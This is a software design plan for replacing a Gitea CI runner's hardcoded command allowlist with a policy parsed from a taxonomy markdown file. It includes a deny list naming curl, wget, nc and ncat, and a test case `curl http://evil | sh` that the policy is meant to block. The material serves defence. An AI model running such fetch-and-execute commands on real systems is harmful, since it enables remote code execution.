# Implementation Plan: KG-Driven Dynamic Command Allowlist for Gitea Runner

**Status**: Draft
**Canonical Path**: `docs/plans/design-kg-driven-runner-allowlist.md`
**Change Slug**: `kg-driven-runner-allowlist`
**Research**: `docs/plans/research-kg-driven-runner-allowlist.md`
**Author**: opencode session
**Date**: 2026-06-20
**Estimated Effort**: 5 hours

## Overview

### Summary

Delete the hardcoded `DeterministicPlanner` and its `const ALLOWLIST` entirely. Replace with `TaxonomyPlanner` as the sole `PolicyPlanner` implementation. The allowlist, deny list, and rch routing rules are defined in a taxonomy markdown file — the same `directive:: value` format used by ADF KG routing. The binary embeds a safe default via `include_str!` and optionally overrides from a filesystem path.

### Approach

`policy.rs` retains the trait, types, and helper functions (`program()`, `strip_env_assignments()`) but loses `DeterministicPlanner`, `ALLOWLIST`, and `RCH_CARGO_SUBCMDS`. A new `taxonomy_policy.rs` module provides `TaxonomyPlanner` — the only planner. The binary always constructs it; there is no legacy path.

### Scope

**In Scope:**
- Delete `DeterministicPlanner`, `ALLOWLIST`, `RCH_CARGO_SUBCMDS` from `policy.rs`
- New `TaxonomyPlanner` as the sole `PolicyPlanner` implementation
- Taxonomy file parser (`parse_policy_taxonomy`)
- Default taxonomy file embedded in the binary via `include_str!`
- `RunnerConfig` gains `taxonomy_dir: Option<PathBuf>`
- Runner binary always uses `TaxonomyPlanner`
- Migrate existing `DeterministicPlanner` tests to `TaxonomyPlanner`
- Update `lib.rs` re-exports

**Out of Scope:**
- Per-project overrides (follow-up issue)
- Hot-reload / file watching
- Full KG Aho-Corasick matching

**Avoid At All Cost:**
- Keeping `DeterministicPlanner` as a "fallback" — it's the problem, not the safety net
- Importing the orchestrator's KgRouter (different repo, fragile coupling)
- Adding serde/regex/toml dependencies for the parser (string splitting is sufficient)
- Env-var feature flag to toggle between planners — there is only one planner

## Architecture

### Component Diagram

```
Runner binary (main)
  │
  ├─ TaxonomyPlanner::new(config)
  │    ├─ If config.taxonomy_dir set:
  │    │    Read <dir>/command_policy.md
  │    │    Parse allow::, deny::, route_to:: directives
  │    │    On parse error: log warning, use embedded default
  │    ├─ Else:
  │    │    Use embedded default_policy.md (include_str!)
  │    └─ Probe PATH for rch → set rch_available
  │
  └─ Poller::new(client, Arc::new(planner), config, checkout_dir)
```

No branching between planners. `TaxonomyPlanner` is the only implementation of `PolicyPlanner`.

### Data Flow

```
default_policy.md (embedded)  ──┐
                                 ├─ parse_policy_taxonomy(&str) ──→ CommandPolicy
command_policy.md (filesystem) ─┘                                   ├─ allowed: HashSet<String>
                                                                    ├─ denied: HashSet<String>
                                                                    └─ rch_routing: HashMap<String, Vec<String>>
         │
         ▼
TaxonomyPlanner { policy, rch_available }
         │
         └─ impl PolicyPlanner::compile(workflow)
              ├─ for each step: program(command)   [reuses policy.rs helper]
              ├─ denied.contains(prog) → Err
              ├─ !allowed.contains(prog) → Err
              ├─ rch_routing matches + rch_available → rewrite to "rch exec -- ..."
              └─ else → Host route
```

### Key Design Decisions

| Decision | Rationale | Alternatives Rejected |
|----------|-----------|----------------------|
| **Delete `DeterministicPlanner` entirely** | It is the source of the merge conflict. Keeping it as a "fallback" perpetuates the two-source-of-truth problem. The embedded default taxonomy IS the baseline. | Keep as fallback — rejected: two planners means two places to update the allowlist |
| `policy.rs` keeps trait + helpers, loses planner + consts | The trait (`PolicyPlanner`), enums (`CommandRoute`, `TrustLevel`), `ExecutionPlan`, and helpers (`program()`, `strip_env_assignments()`) are framework code. Only the implementation and the static data are removed. | Move everything to `taxonomy_policy.rs` — rejected: trait and helpers are policy-agnostic infrastructure |
| `include_str!` embedded default | Runner always has a safe baseline even without repo checkout. This replaces the compile-time `const ALLOWLIST` with a compile-time `include_str!` — same guarantee, data not code. | Network fetch from orchestrator — fragile, adds latency, coupling |
| `HashSet<String>` for allow/deny | O(1) lookup, matches current `ALLOWLIST.contains()` semantics | Vec with linear scan — slower, no benefit at this scale |
| No env-var toggle between planners | There is one planner. `taxonomy_dir` controls which taxonomy file is loaded, not which planner is used. | `RUNNER_USE_LEGACY=1` — rejected: invites confusion, defeats the purpose |
| Migrate existing tests to `TaxonomyPlanner` | Tests assert routing behaviour (cargo→rch, docker blocked, env-prefix stripping). The assertions are identical; only the constructor changes. | Delete old tests and write new ones — rejected: loses coverage during migration |

### Simplicity Check

**What if this could be easy?** It is. We're deleting a struct + two consts and replacing them with a parser + a markdown file. Net code change: approximately +120 lines (parser + planner + taxonomy file), -100 lines (DeterministicPlanner + consts + old tests). Net: roughly flat, but the allowlist is now data.

**Nothing Speculative Checklist:**
- [x] No features the user didn't request
- [x] No abstractions "in case we need them later"
- [x] No flexibility "just in case"
- [x] No error handling for scenarios that cannot occur
- [x] No premature optimization
- [x] No legacy fallback path

## File Changes

### New Files

| File | Purpose |
|------|---------|
| `crates/terraphim_gitea_runner/src/taxonomy_policy.rs` | `TaxonomyPlanner`, `CommandPolicy`, `parse_policy_taxonomy`, all tests |
| `crates/terraphim_gitea_runner/default_policy.md` | Embedded default taxonomy (replaces `const ALLOWLIST` + `const RCH_CARGO_SUBCMDS`) |
| `docs/taxonomy/runner/command_policy.md` | Deployed override file (mirrors the embedded default; edit this to change runner policy) |

### Modified Files

| File | Changes |
|------|---------|
| `crates/terraphim_gitea_runner/src/policy.rs` | **Delete** `DeterministicPlanner` struct + impl + `Default` impl + `detect()` + `with_rch_available()` + `route()`. **Delete** `const ALLOWLIST` and `const RCH_CARGO_SUBCMDS`. **Keep** `PolicyPlanner` trait, `CommandRoute`, `TrustLevel`, `ExecutionPlan`, `program()`, `strip_env_assignments()`, `is_env_name()`, `consume_assignment_value()`. Make helpers `pub(crate)`. **Delete** the `#[cfg(test)] mod tests` block (tests migrate to `taxonomy_policy.rs`). |
| `crates/terraphim_gitea_runner/src/lib.rs` | Remove `DeterministicPlanner` from `pub use`. Add `pub mod taxonomy_policy;` and `pub use taxonomy_policy::{TaxonomyPlanner, CommandPolicy};` |
| `crates/terraphim_gitea_runner/src/config.rs` | Add `taxonomy_dir: Option<PathBuf>` to `RunnerConfig` |
| `crates/terraphim_gitea_runner/src/bin/terraphim-gitea-runner.rs` | Always construct `TaxonomyPlanner::new(&config)` instead of `DeterministicPlanner::detect()` |

### Deleted Code (from `policy.rs`)

```rust
// DELETED — replaced by default_policy.md taxonomy file
const ALLOWLIST: &[&str] = &[
    "cargo", "make", "bun", "bunx", "npm", "yarn", "pnpm", "rch", "sccache", "echo", "mkdir",
    "git", "ls", "cat", "cd", "cp", "mv", "rm", "chmod", "sh", "bash", "test", "export", "source",
    "true", "set", "rustup",
];

// DELETED — replaced by route_to:: directive in default_policy.md
const RCH_CARGO_SUBCMDS: &[&str] = &["build", "check", "clippy", "doc"];

// DELETED — replaced by TaxonomyPlanner
pub struct DeterministicPlanner { rch_available: bool }
impl Default for DeterministicPlanner { ... }
impl DeterministicPlanner { pub fn with_rch_available() ... pub fn detect() ... pub fn route() ... }
#[async_trait] impl PolicyPlanner for DeterministicPlanner { ... }
#[cfg(test)] mod tests { ... }
```

## API Design

### Retained in `policy.rs` (unchanged)

```rust
/// Where a step runs.
pub enum CommandRoute { Host, Rch, Firecracker }

/// Trust classification for a task.
pub enum TrustLevel { Trusted, Untrusted }

/// A compiled, policy-approved execution plan.
pub struct ExecutionPlan {
    pub workflow: ParsedWorkflow,
    pub routes: Vec<CommandRoute>,
    pub trust_level: TrustLevel,
}

/// Compiles a workflow into a policy-approved ExecutionPlan.
#[async_trait]
pub trait PolicyPlanner: Send + Sync {
    async fn compile(&self, workflow: ParsedWorkflow) -> Result<ExecutionPlan>;
}

// Helper functions — promoted to pub(crate)
pub(crate) fn program(cmd: &str) -> &str;
pub(crate) fn strip_env_assignments(cmd: &str) -> &str;
pub(crate) fn is_env_name(name: &str) -> bool;
pub(crate) fn consume_assignment_value(s: &str) -> usize;
```

### New in `taxonomy_policy.rs`

```rust
/// Parsed command policy loaded from a taxonomy file.
#[derive(Debug, Clone)]
pub struct CommandPolicy {
    /// Programs allowed to execute on the host or via rch.
    pub(crate) allowed: HashSet<String>,
    /// Programs explicitly denied (overrides allowed).
    pub(crate) denied: HashSet<String>,
    /// Program -> subcommands to route through rch.
    /// Key = program name (e.g. "cargo"), Value = subcommands (e.g. ["build", "check"]).
    pub(crate) rch_routing: HashMap<String, Vec<String>>,
}

/// The sole policy planner. Loads command policy from a taxonomy markdown file.
///
/// At construction time, reads `<taxonomy_dir>/command_policy.md` if the dir
/// is configured, otherwise falls back to the embedded `default_policy.md`.
/// The policy is immutable for the lifetime of the runner process.
#[derive(Debug, Clone)]
pub struct TaxonomyPlanner {
    policy: CommandPolicy,
    rch_available: bool,
}

impl TaxonomyPlanner {
    /// Construct from runner config.
    ///
    /// If `config.taxonomy_dir` is set, reads `<dir>/command_policy.md`.
    /// Otherwise uses the embedded default. Probes PATH for `rch`.
    pub fn new(config: &RunnerConfig) -> Self;

    /// Construct from raw taxonomy text (for testing).
    pub fn from_text(text: &str, rch_available: bool) -> Self;

    /// Construct from the embedded default (for testing).
    pub fn default_policy(rch_available: bool) -> Self;
}

#[async_trait] impl PolicyPlanner for TaxonomyPlanner { ... }

/// Parse a taxonomy markdown string into a CommandPolicy.
///
/// Recognised directives (one per line, `directive:: value` format):
/// - `allow:: prog1, prog2, ...` — add to allowed set
/// - `deny:: prog1, prog2, ...` — add to denied set (overrides allow)
/// - `route_to:: rch, prog, sub1 sub2 ...` — route program+subcommands to rch
///
/// Lines starting with `#` are comments. Blank lines are ignored.
pub fn parse_policy_taxonomy(text: &str) -> CommandPolicy;
```

### Taxonomy File Format (`default_policy.md`)

```markdown
# Runner Command Policy (Embedded Default)
#
# This file is compiled into the runner binary via include_str!.
# To override at runtime, set RUNNER_TAXONOMY_DIR to a directory
# containing a command_policy.md file.

## Allowed Commands
allow:: cargo, make, bun, bunx, npm, yarn, pnpm, rch, sccache
allow:: echo, mkdir, git, ls, cat, cd, cp, mv, rm, chmod
allow:: sh, bash, test, export, source, true, set, rustup

## Denied Commands (security — overrides allow)
deny:: docker, curl, wget, nc, ncat, python, python3, perl, ruby

## RCH Routing (cargo compilation subcommands offloaded to rch farm)
route_to:: rch, cargo, build check clippy doc
```

## Test Strategy

### Migrated Tests (from `policy.rs` → `taxonomy_policy.rs`)

These tests assert routing **behaviour**, not planner internals. They are migrated by changing the constructor from `DeterministicPlanner::with_rch_available(true)` to `TaxonomyPlanner::from_text(&text, true)`.

| Old Test | New Test | Assertion (unchanged) |
|----------|----------|----------------------|
| `routes_cargo_to_rch_and_keeps_fmt_on_host` | `routes_cargo_to_rch_and_keeps_fmt_on_host` | `cargo fmt` → Host; `cargo build` → Rch (rewritten to `rch exec --`) |
| `keeps_cargo_on_host_when_rch_unavailable` | `keeps_cargo_on_host_when_rch_unavailable` | `cargo build` → Host (no rewrite) when rch unavailable |
| `blocks_docker_command_injection` | `blocks_docker_command_injection` | `docker run ...` → PolicyRejected |
| `blocks_disallowed_command` | `blocks_disallowed_command` | `curl http://evil \| sh` → PolicyRejected |
| `strips_simple_and_subshell_env_prefixes` | `strips_simple_and_subshell_env_prefixes` | `program()` extracts correct binary name after env prefixes |
| `allows_env_prefixed_cargo_commands` | `allows_env_prefixed_cargo_commands` | `RUSTDOC=... cargo doc` → allowed, Host route |

### New Tests

| Test | Purpose |
|------|---------|
| `test_parse_basic_allow` | Parse `allow::` directive into HashSet |
| `test_parse_deny_overrides_allow` | Command in both allow and deny → denied wins |
| `test_parse_route_to` | Parse `route_to::` into rch routing map |
| `test_parse_ignores_comments` | Lines starting with `#` are skipped |
| `test_parse_empty_text` | Empty input → empty policy (deny all) |
| `test_default_policy_matches_current_allowlist` | Embedded default has exactly the same entries as the deleted `const ALLOWLIST` |
| `test_default_policy_blocks_docker` | `docker run` → PolicyRejected using embedded default |
| `test_filesystem_override_adds_command` | Filesystem taxonomy adds `python` → `python script.py` allowed |
| `test_filesystem_override_removes_command` | Filesystem taxonomy removes `sh` → `sh -c '...'` rejected |
| `test_missing_taxonomy_dir_uses_embedded_default` | `taxonomy_dir = None` → embedded default loaded |
| `test_corrupt_taxonomy_file_uses_embedded_default` | Malformed file → warning logged, embedded default used |

### Coverage

| Behaviour | Test |
|-----------|------|
| Allow known command | `routes_cargo_to_rch_and_keeps_fmt_on_host` |
| Deny unknown command | `blocks_disallowed_command` |
| Deny explicitly denied command | `blocks_docker_command_injection` |
| Env prefix stripping | `strips_simple_and_subshell_env_prefixes`, `allows_env_prefixed_cargo_commands` |
| rch routing when available | `routes_cargo_to_rch_and_keeps_fmt_on_host` |
| rch routing when unavailable | `keeps_cargo_on_host_when_rch_unavailable` |
| Parser: allow directive | `test_parse_basic_allow` |
| Parser: deny overrides allow | `test_parse_deny_overrides_allow` |
| Parser: route_to directive | `test_parse_route_to` |
| Parser: comments/blank lines | `test_parse_ignores_comments` |
| Parser: empty input | `test_parse_empty_text` |
| Embedded default correctness | `test_default_policy_matches_current_allowlist` |
| Filesystem override: add | `test_filesystem_override_adds_command` |
| Filesystem override: remove | `test_filesystem_override_removes_command` |
| Missing taxonomy dir | `test_missing_taxonomy_dir_uses_embedded_default` |
| Corrupt taxonomy file | `test_corrupt_taxonomy_file_uses_embedded_default` |

## Implementation Steps

### Step 1: Create taxonomy file + parser + CommandPolicy

**Files:** `crates/terraphim_gitea_runner/default_policy.md`, `crates/terraphim_gitea_runner/src/taxonomy_policy.rs` (parser + types only)
**Description:** Write the default taxonomy markdown file. Implement `CommandPolicy` struct and `parse_policy_taxonomy` function.
**Tests:** `test_parse_basic_allow`, `test_parse_deny_overrides_allow`, `test_parse_route_to`, `test_parse_ignores_comments`, `test_parse_empty_text`
**Estimated:** 1 hour

```rust
pub fn parse_policy_taxonomy(text: &str) -> CommandPolicy {
    let mut allowed = HashSet::new();
    let mut denied = HashSet::new();
    let mut rch_routing = HashMap::new();

    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') { continue; }
        if let Some(rest) = line.strip_prefix("allow::") {
            for prog in rest.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                allowed.insert(prog.to_string());
            }
        } else if let Some(rest) = line.strip_prefix("deny::") {
            for prog in rest.split(',').map(str::trim).filter(|s| !s.is_empty()) {
                denied.insert(prog.to_string());
            }
        } else if let Some(rest) = line.strip_prefix("route_to::") {
            let parts: Vec<&str> = rest.split(',').map(str::trim).collect();
            if parts.len() >= 3 {
                let prog = parts[1];
                let subcmds = parts[2].split_whitespace()
                    .map(String::from).collect();
                rch_routing.insert(prog.to_string(), subcmds);
            }
        }
    }
    CommandPolicy { allowed, denied, rch_routing }
}
```

### Step 2: Implement TaxonomyPlanner

**Files:** `crates/terraphim_gitea_runner/src/taxonomy_policy.rs` (add planner)
**Description:** Implement `TaxonomyPlanner` with `new()`, `from_text()`, `default_policy()`, and `PolicyPlanner` trait. Reuse `program()` and `strip_env_assignments()` from `policy.rs` (now `pub(crate)`).
**Tests:** `test_default_policy_matches_current_allowlist`, `test_default_policy_blocks_docker`, `test_missing_taxonomy_dir_uses_embedded_default`, `test_corrupt_taxonomy_file_uses_embedded_default`
**Dependencies:** Step 1
**Estimated:** 1 hour

```rust
impl TaxonomyPlanner {
    pub fn new(config: &RunnerConfig) -> Self {
        let rch_available = probe_rch();
        let text = config.taxonomy_dir.as_ref()
            .and_then(|dir| {
                let path = dir.join("command_policy.md");
                std::fs::read_to_string(&path).ok()
            })
            .unwrap_or_else(|| {
                if config.taxonomy_dir.is_some() {
                    log::warn!("taxonomy file not found or unreadable; using embedded default");
                }
                include_str!("../default_policy.md")
            });
        Self {
            policy: parse_policy_taxonomy(&text),
            rch_available,
        }
    }
}
```

### Step 3: Delete DeterministicPlanner, update policy.rs

**Files:** `crates/terraphim_gitea_runner/src/policy.rs`
**Description:** Remove `DeterministicPlanner` struct, `Default` impl, `detect()`, `with_rch_available()`, `route()`, `PolicyPlanner` impl, `const ALLOWLIST`, `const RCH_CARGO_SUBCMDS`, and the `#[cfg(test)] mod tests` block. Promote `program()`, `strip_env_assignments()`, `is_env_name()`, `consume_assignment_value()` to `pub(crate)`.
**Dependencies:** Step 2 (TaxonomyPlanner must exist before deleting old planner)
**Estimated:** 30 minutes

### Step 4: Migrate tests to taxonomy_policy.rs

**Files:** `crates/terraphim_gitea_runner/src/taxonomy_policy.rs` (add test module)
**Description:** Port the 6 existing test functions from `policy.rs`, changing constructors from `DeterministicPlanner::with_rch_available(b)` to `TaxonomyPlanner::from_text(include_str!("../default_policy.md"), b)`. Add new parser and override tests.
**Dependencies:** Step 3
**Estimated:** 1 hour

### Step 5: Wire into runner binary, config, and lib.rs

**Files:** `crates/terraphim_gitea_runner/src/lib.rs`, `crates/terraphim_gitea_runner/src/config.rs`, `crates/terraphim_gitea_runner/src/bin/terraphim-gitea-runner.rs`
**Description:**
- `lib.rs`: Replace `pub use policy::DeterministicPlanner` with `pub use taxonomy_policy::{TaxonomyPlanner, CommandPolicy}`
- `config.rs`: Add `taxonomy_dir: Option<PathBuf>` field (default `None`)
- Binary: Replace `DeterministicPlanner::detect()` with `TaxonomyPlanner::new(&config)`
**Dependencies:** Step 4
**Estimated:** 30 minutes

Binary change:
```rust
// BEFORE:
let poller = Poller::new(
    client,
    Arc::new(DeterministicPlanner::detect()),
    config,
    checkout_dir,
);

// AFTER:
let poller = Poller::new(
    client,
    Arc::new(TaxonomyPlanner::new(&config)),
    config,
    checkout_dir,
);
```

Config change:
```rust
// config.rs
pub struct RunnerConfig {
    // ... existing fields ...
    /// Directory containing command_policy.md. If None, uses embedded default.
    pub taxonomy_dir: Option<PathBuf>,
}

impl Default for RunnerConfig {
    fn default() -> Self {
        Self {
            // ... existing defaults ...
            taxonomy_dir: None,
        }
    }
}
```

### Step 6: Deploy taxonomy file to bigbox

**Files:** `docs/taxonomy/runner/command_policy.md`
**Description:** Create the deployed taxonomy file. Set `RUNNER_TAXONOMY_DIR=/data/projects/terraphim/terraphim-ai/docs/taxonomy/runner` in the runner systemd unit.
**Dependencies:** Step 5 merged and deployed
**Estimated:** 30 minutes

## Rollback Plan

There is no legacy planner to fall back to. Rollback is `git revert` of the merge commit.

The embedded `default_policy.md` is compiled into the binary and mirrors the old `const ALLOWLIST` exactly (verified by `test_default_policy_matches_current_allowlist`). If the filesystem taxonomy is missing or corrupt, the runner uses the embedded default and logs a warning. This is strictly safer than the old `const`, which had no runtime override mechanism at all.

## Open Items

| Item | Status | Owner |
|------|--------|-------|
| Research approved | Pending | User |
| Design approved | Pending | User |
| Per-project overrides | Deferred (follow-up issue) | TBD |
